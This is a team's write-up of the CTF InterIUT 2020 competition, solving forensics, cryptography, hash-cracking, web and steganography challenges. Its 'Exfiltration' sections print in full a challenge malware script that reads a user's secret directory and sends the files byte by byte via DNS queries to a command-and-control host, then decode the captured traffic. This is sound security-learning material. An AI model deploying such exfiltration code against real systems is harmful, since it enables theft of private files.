# CTF InterIUT 2020 Write-ups
Event: **CTF InterIUT 2020, 27-29 November 2020** | [official URL](https://ctf.hack2g2.fr/)

Final position: **26th** | [Full Scoreboard here](https://ctftime.org/event/1176)

Our Team: **CangureTheFlat** | [CTFtime page](https://ctftime.org/team/137370)

Formed by: 
* [Gregorio Galletti](https://github.com/gregalletti)
* [Marco Gasperini](https://github.com/marcuz1996)
* [Stefano Bagarin](https://github.com/stepolimi)
* [Cristian Spagnuolo](https://github.com/filippinifra)

**Disclaimer:** we are not French (:unamused:), nobody in the team speaks it (:unamused::unamused:): this CTF was in french-only (:unamused::unamused::unamused:)

We had an hard time on reading carefully all the challenges descriptions and hints, but we are still proud of our result.

## Introduction Challenge
> At the moment of the team registration, we were given an introductive challenge that you can find here: https://pastebin.com/raw/1BZZyE8K

> Of course this was not part of the CTF itself, but we solved it anyway.

I immediately tried to save the string and open it, resulting in an ELF file. Ok, so now we can try to debug it and to disassemble it.

I used Ghidra to disassemble the code and try to understand it, and gdb with pwntools to play a bit with the execution. So that was a classic input problem, where we have to send a specific input to the program in order to get the "You Won" output, and our input would be the flag.

Knowing that I tried to get a basic knowledge of the code: input required length and other contraints..

# Write Ups - Categories and Points
## Forensics

### Ping Pong
![c](https://img.shields.io/badge/Forensics-green) ![p](https://img.shields.io/badge/Points-50-success) ![a](https://img.shields.io/badge/author-b4g4,_grigg0swagg0-lightgrey)

> Description

We were given a *.pcapng* file to download and by opening it with ```Wireshark``` we noticed a lot of ping request and response packets: by looking at the content of the first we can see that containss an 'H', and the second contains a '2', so we can assume that this is the start of the flag. Obviously the characters were repeated, so we first wrote the content of the pcap to a txt with ```xxd ping_pong.pcapng > dio.txt```, and then extracted only the relevant chars with a very simple Python script (ok, maybe it's not the most elegant solution): 

```python
#first = 1419
#offset = 680

f = open("dio.txt", "r")
text = f.read()

flag = text[1419]

i = 1419 + 680

while i < len(text):
	flag = flag + text[i]
	i = i + 680

print(flag)
```

Resulting in this (very long) flag:
**H2G2{y0u_r34lly_7h1nk_y0u'r3_60nn4_b3_4bl3_70_c0py_7h3_fl46_m4nu4lly?_y0u'd_b3773r_m4k3_4_5cr1p7_70_3x7r4c7_7h15_v3ry_v3ry_v3ry_v3ry_l0000000nnnnnnnnnnnnnnn666666666_fl46_7h47_y0u'll_n3v3r_h4v3_71m3_70_c0py!_l0r3m_1p5um_d0l0r_517_4m37,_c0n53c737ur_4d1p15c1n6_3l17,_53d_d0_31u5m0d_73mp0r_1nc1d1dun7_u7_l4b0r3_37_d0l0r3_m46n4_4l1qu4._u7_3n1m_4d_m1n1m_v3n14m,_qu15_n057rud_3x3rc174710n_ull4mc0_l4b0r15_n151_u7_4l1qu1p_3x_34_c0mm0d0_c0n53qu47._du15_4u73_1rur3_d0l0r_1n_r3pr3h3nd3r17_1n_v0lup7473_v3l17_3553_c1llum_v3r174715_37_qu451_4rch173c70_b34743_v1743_d1c74_5un7_3xpl1c4b0._n3m0_3n1m_1p54m_v0lup7473m_qu14_v0lup745_517_45p3rn47ur_4u7_0d17_4u7_fu617,_53d_qu14}**


### Exfiltration 1
![c](https://img.shields.io/badge/Forensics-green) ![p](https://img.shields.io/badge/Points-50-success) ![a](https://img.shields.io/badge/author-b4g4,_grigg0swagg0-lightgrey)

> Description

This is the first of the three Exfiltration challenges.
For this challenge, we had do download a torrent containing a WireShark capture file. By going thorugh the downloaded files in the packets exchange in WireShark, we found a python script called the_game.py downloaded by monkey.bzh:8080. We downloaded the file ourselves and, with a fast look at it, it became clear that it was the malware.

![Alt text](./exfiltration1.PNG?raw=true "Exfiltration1")

*the_game.py*  

```python
#!/usr/bin/env python3
# coding: utf8

from Crypto.PublicKey import RSA
from binascii import hexlify
import base64
from random import randint
from os import listdir
from os.path import isfile, join
import json

C2 = "monkey.bzh"
KEY = RSA.generate(4096, e=3)


def start_exfiltration(f_name: str):
    m = base64.b64encode((f"Starting exfiltration of the file {f_name}").encode())
    sr1(IP(dst=C2)/UDP(sport=RandShort(), dport=53)/DNS(rd=1,qd=DNSQR(qname=format_query(m),qtype="A")),timeout=randint(1, 10))


def end_exfiltration(f_name: str):
    m = base64.b64encode(f"The file {f_name} has been extracted".encode())
    sr1(IP(dst=C2)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=format_query(m))),verbose=0,timeout=randint(1, 10))


def exfiltrate_data(message):
	print(message)
    m = base64.b64encode(message.encode())
    sr1(IP(dst=C2)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=format_query(m))),verbose=0,timeout=randint(1, 10))


def format_query(message: bytes) -> bytes:
    message = message.decode()
    n = 32
    data = [message[i:i+n] for i in range(0, len(message), n)]
    url = '.'.join(data) + '.' + C2
    return url.encode()


def lambdhack_like_rsa(f_name: str):
    with open(f_name, "rb") as f:
        data = f.read(1)
        while data:
            print("char: ")
            print(data)
            flag = int(hexlify(data),16)
            print("hex: " + str(flag))
            encoded = pow(flag, KEY.e, KEY.n)
            print("encoded: " + str(encoded))
            exfiltrate_data(i_m_a_monkey(encoded))
            data = f.read(1)


def i_m_a_monkey(i_wanna_be_a_monkey):
    my_super_monkey = ""
    for monkey in str(i_wanna_be_a_monkey):
        print ("monkey: " + monkey)
        monkey = int(monkey)
        my_super_monkey += int(monkey/5)*"🙈" + int(monkey%5)*"🙉" + "🙊🙊"
    return my_super_monkey


if __name__=='__main__':
    PATH = "/home/Brian/.secret/"
    FILES = [f for f in listdir(PATH) if isfile(join(PATH, f))]

    for f in FILES:
        start_exfiltration(PATH + f)
        lambdhack_like_rsa(PATH + f)
        end_exfiltration(PATH + f)
```

The flag was simply the name of the malware between "H2G2{}", so it was: 

**H2G2{the_game.py}**

### Exfiltration 2
![c](https://img.shields.io/badge/Forensics-green) ![p](https://img.shields.io/badge/Points-100-success) ![a](https://img.shields.io/badge/author-b4g4,_grigg0swagg0-lightgrey)

> Description

This is the second of the three Exfiltration challenges.  
For this part, our goal was to find the name of the files exfiltrated by the malware. As first thing, we looked at the malicious script and we found out that that script first sends a string containing the name of the file, then the encrypted bytes of the file one at a time, and last a string to terminate it throught the DNS protocol.  
As next step we retrieved the ip address of monkey.bhz and added the filter "ip.dst == 172.25.0.2 and !icmp and !tcp" in the packet capture of Wire Shark to see only the packets sent to the ip address of our interest with the UDP protocol.  
Giving to the filtered packets a closer look, we recognized that all of them had the same content format, so by ordering them by info, we identified 6 packets that had different named: those had to be the packets of start and end of 3 file transmissions.

![Alt text](./exfiltration2.PNG?raw=true "Exfiltration2")

The names of the starting packets are:

U3RhcnRpbmcgZXhmaWx0cmF0aW9uIG9m.IHRoZSBmaWxlIC9ob21lL0JyaWFuLy5z.ZWNyZXQvQ29uZmlkZW50aWFsLnBkZg==.monkey.bzh  
U3RhcnRpbmcgZXhmaWx0cmF0aW9uIG9m.IHRoZSBmaWxlIC9ob21lL0JyaWFuLy5z.ZWNyZXQvQ29uZmlkZW50aWFsLmpwZw==.monkey.bzh  
U3RhcnRpbmcgZXhmaWx0cmF0aW9uIG9m.IHRoZSBmaWxlIC9ob21lL0JyaWFuLy5z.ZWNyZXQvZmxhZy50eHQ=.monkey.bzh  

By taking off ".monkey.bzh" and decoding them from base64 with a simple online tool, we found:

Starting exfiltration of the file /home/Brian/.secret/Confidential.pdf  
Starting exfiltration of the file /home/Brian/.secret/Confidential.jpg  
Starting exfiltration of the file /home/Brian/.secret/flag.txt  

All we had to do now was extracting the file names from the string and put them into our flag format and we obtained:

**H2G2{Confidential.pdf,Confidential.jpg,flag.txt}**

### Exfiltration 3
![c](https://img.shields.io/badge/Forensics-green) ![p](https://img.shields.io/badge/Points-200-success) ![a](https://img.shields.io/badge/author-b4g4,_grigg0swagg0-lightgrey)

> Description

This is the third of the three Exfiltration challenges.
The goal of this last part was to retrieve the exfiltrated files and find a flag in those documents. The first step was to understand that the script red and sent one byte at a time after a proper encoding of it: the malware converts each byte into its hexadecimal value, converts the hex in a decimal number and further converts each digit of the number into a... "monkey form":

>my_super_monkey += int(monkey/5)*"🙈" + int(monkey%5)*"🙉" + "🙊🙊"

For example, 945 becomes: "🙈🙉🙉🙉🙉🙊🙊🙉🙉🙉🙉🙊🙊🙈🙊🙊"

And, as a last thing, the monkey string was encoded to base64 before sending it.

Once understood the script, we moved on to identify the file of our interest. We saw immediatelly that one of the stolen files was called flag.txt: it consisted in only 40 transmitted packets, so we went ahead, wrote a simple python script to revert the encoding made by the malware to each byte of the file before sending it and launched it on the flag packets.  
With our surprise, we received this as output:  

*flag.txt*  

> H2G2{This_is_not_the_flag_¯\_(ツ)_/¯}

Sadly it was just a bait.  

At this point we decided to export from WireShark all the packets of the three files in a json format (which can be found in the maliciousPackets.rar archieve) and to modify our script to take the content of each packet from it to ultimately reconstruct the documents.  
The final script is:  

```python
#!/usr/bin/env python3

from binascii import *
import base64
import json

count = 0
f1 = open("Confidential.pdf","wb")
f2 = open("Confidential.jpg","wb")
f3 = open("flag.txt","wb")

with open('./allPackets.json') as json_file:
  data = json.load(json_file)
  for p in data:
    bigNum = ""  
    prevMonkey = "🙈"
    prev = False
    num = 0

    keys = list(p['_source']['layers']['dns']['Queries'].keys())[0]
    index = str(p['_source']['layers']['dns']['Queries'][keys]['dns.qry.name']).find(".monkey")
    message = str(p['_source']['layers']['dns']['Queries'][keys]['dns.qry.name'])[0:index]

    if(not message[0] == '8' ):
        count +=1
        continue

    monkeyList = base64.b64decode(message.encode("utf-8")).decode()

    for monkey in monkeyList:
      if monkey == "🙊":
        if prevMonkey == "🙊":
             prev = True
             bigNum += str(num)
             num = 0
      if monkey == "🙈":
        num += 5
      if monkey == "🙉":
        num +=1
      if not prev :
         prevMonkey = monkey
      else:
         prevMonkey = "🙈"
         prev = False

    decAscii = int(round(pow(int(bigNum), 1/3),1))
    hexa = str(hex(decAscii)[2:])
    if(len(hexa) != 2):
        hexa = "0" + hexa
    
    char = unhexlify(hexa)
    if(count == 1):
    	f1.write(char)
    if(count == 3):
        f2.write(char)
    if (count == 5):
        f3.write(char)
 
f1.close()
f2.close()
f3.close()
```

<br />
Onece launched, after a minute it gave us the following outputs:
<br />
<br />

*Confidenial.jpg*  
<br />
![Alt text](./Confidential.jpg?raw=true "Confidential")
<br />

*Content of flag.txt*  

> H2G2{This_is_not_the_flag_¯\_(ツ)_/¯}
<br />

*Content of Confidential.pdf*  

> This Flag is confidential : H2G2{DN5_3xf1l7r4710n_15_funny!!!}  
<br />

So the flag was contained in the Confidential.pdf file and it was:  

**H2G2{DN5_3xf1l7r4710n_15_funny!!!}**

## Hash Cracking

### We will rock you
![c](https://img.shields.io/badge/Hash_Cracking-orange) ![p](https://img.shields.io/badge/Points-50-success) ![a](https://img.shields.io/badge/author-grigg0swagg0-lightgrey)
> 0a5a0a121c309891420d117b7efc169d78ec233351e2b86b9778df7af3bd8a5e82ab3d3715b7fa405cca193dc7c6e484acec3bdf343ea94667c6be451a508e9a

Pretty easy hash cracking challenge, we can easily notice from the title that maybe a simple ```John``` + ```rockyou.txt``` wordlist would be enough. And in fact, the password was just a simple character sequence.

Flag: H2G2{ilovejhonny}

## Cryptography

### Le SAGE doré
![c](https://img.shields.io/badge/Cryptography-orange) ![p](https://img.shields.io/badge/Points-50-success) ![a](https://img.shields.io/badge/author-b4g4,_grigg0swagg0-lightgrey)
> Description
https://doc.sagemath.org/html/en/reference/cryptography/sage/crypto/public_key/blum_goldwasser.html

small N => te lo pigli nel culo

Flag: **H2G2{0k_B0om3R}**

### La voie du SAGE
![c](https://img.shields.io/badge/Cryptography-orange) ![p](https://img.shields.io/badge/Points-50-success) ![a](https://img.shields.io/badge/author-b4g4,_grigg0swagg0-lightgrey)
> https://sagecell.sagemath.org/?z=eJxVzj2LwkAUheE-kP8QtEnAYj7vzSAWImIKsVnYdrnO3InBGCUJYv69ilvsdqd4eTjzbFOt9_vtYbdNkzSpslVW8YMC--ZC7dfYN1095EWa-OZ24p7DT2ypflf5DGPJyApBGhGZAgZ7lJrQYgBNjpS0zpXOGXRCm9lf5MzTx9BovcZoI8TgyYAshQ9CW8EAHoCCUqWyhqQx4PFtpMm9qbl7MS_h-3du-uk2XodpGPmSV4us5S7_97golk-WTESx&lang=sage&interacts=eJyLjgUAARUAuQ==

Actually a weird challenge, we tried to understand bit more about Sage and Vigenerè but then we realized that we could just decrypt the given ciphertext with the give key, LOL

We searched for the syntax here: https://doc.sagemath.org/html/en/reference/cryptography/sage/crypto/classical.html

The only code line we had to add was ```print(vigenere.deciphering(ciphered_key, ciphered_flag));```, resulting in a hexadecimal string: ```483247327b533467655f4372597074305f31735f335a7d```. By just converting it into ASCII chars we got the flag.

Flag: **H2G2{S4ge_CrYpt0_1s_3Z}** 

### Homo Accerus
![c](https://img.shields.io/badge/Cryptography-orange) ![p](https://img.shields.io/badge/Points-50-success) ![a](https://img.shields.io/badge/author-b4g4,_grigg0swagg0-lightgrey)
> Description

3638-4738-6454

POST /transactions/make HTTP/1.1
Host: homo-accerus.interiut.ctf
User-Agent: Bank/5.0 (x64; rv:85.0) Masterfox/83.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 687
Content-Type: application/x-www-form-urlencoded

sender=2021-6329-0004&receiver=3638-4738-6454&rsa-encrypted-amount=62508003691955481690418901955121795568007256515741783155795444245740636426057547904329949383645124412455925887910924422648916791078340467132412323560710978587121861334956401507516587624120449879418813403070550485792604237611403907218111719508751300849137282838643224414695053627144165528294962256617439047092392029968770700080403581271667805269164654784974860506346245830305667955665133964758035692743329015828920734126548722790007590931405240654421621913828190132402835380728007018161783200211722413959807646492280466745701690396058608241960771610594344496541655043663887677078699101112740215664968380850617448985390600

Flag: **H2G2{HOMO_BRO_<3}**

## Web
### Skull partie 1
![c](https://img.shields.io/badge/Web-red) ![p](https://img.shields.io/badge/Points-10-success) ![a](https://img.shields.io/badge/author-marcuz-lightgrey)


### MonSQL Injection 1
![c](https://img.shields.io/badge/Web-red) ![p](https://img.shields.io/badge/Points-20-success) ![a](https://img.shields.io/badge/author-b4g4,_grigg0swagg0-lightgrey)
> Description
===========================
MonSQL
============================
sélectionne tout àpartirde utilizateur;

SÉLECTIONNE table_schema, table_name, 1 ÀPARTIRDE  information_schema.tables;

SÉLECTIONNE TOUT ÀPARTIRDE reponses;

**H2G2{j_3sper3_qu3_v0us_4v3z_tr0uv3_ca_f4cil3_?}**

### La théourie des graphes
![c](https://img.shields.io/badge/Web-red) ![p](https://img.shields.io/badge/Points-20-success) ![a](https://img.shields.io/badge/author-marcuz-lightgrey)

The query we want to execute is:
```
{
	GetCourse(id:i){
		id
		title,
		content,
	published
	}
}
```

Using a simple ```Python``` script to send 200 requests, this one:

```python
import requests
import json

for i in range(1, 200):
    r = requests.get("http://theourie-des-graphes.interiut.ctf/graphql?query=%7B%20%0A%20%20GetCourse(id%3A{0})%20%7B%0A%20%20%20%20id%0A%20%20%20%20title%2C%0A%20%20%20%20content%2C%0A%20%20%20%20published%0A%20%20%7D%0A%0A%7D".format(i))

    j = json.loads(r.text)['data']['GetCourse']
    if j['published'] == False:
        print("[*] course {0} not published".format(i))
```

We easily figured out that the interesting course was the 69th, and by looking at it we could see its content: ""


## Unsolved Challenges
Unfortunately, we did not manage to solve some challenges that were pretty feasible for us. Here I will put the writeups anyway because they may be helpful sooner or later.

### Stego 1
**Reason of failure**: no idea on where to start

A nice hint was in the description, saying that their favourite color is red. Btw we had no idea on how to use this, we tried to apply red masks, subtract red masks, ..

We later found the flag by uploading the image to [StegOnline](https://stegonline.georgeom.net/upload) and extracting the red pixels:

![Alt text](./stego1_1.PNG?raw=true "stego1_1")

the flag was just there.

![Alt text](./stego1_2.PNG?raw=true "stego1_2")

The flag becomes **H2G2{LSB_1S_0V3RRAT3D}**

### Stego 2
**Reason of failure**: in the challenge description there was a good hint, but we totally missed it because of the translation

![Alt text](./chall.png?raw=true "chall")

By just looking at the hex values of colors and convert the to ASCII chars we were able to extract the flag, and the correct order was given in the description. Here are the colors:

```
#433031 === background-left
#307235 === background-middle
#5f4330 === background-right
#643335 === foreground-left
#5f4d34 === foreground-middle
#4e5f21 === foreground-right
```

Putting them all together results in ```4330313072355f43306433355f4d344e5f21```, and converted in ASCII: ```C010r5_C0d35_M4N_!```

Flag: **H2G2{C010r5_C0d35_M4N_!}**

### 1110011 1100001 1101100 1110101 1110100
**Reason of failure**: no possibility to send anything to the server during the CF 

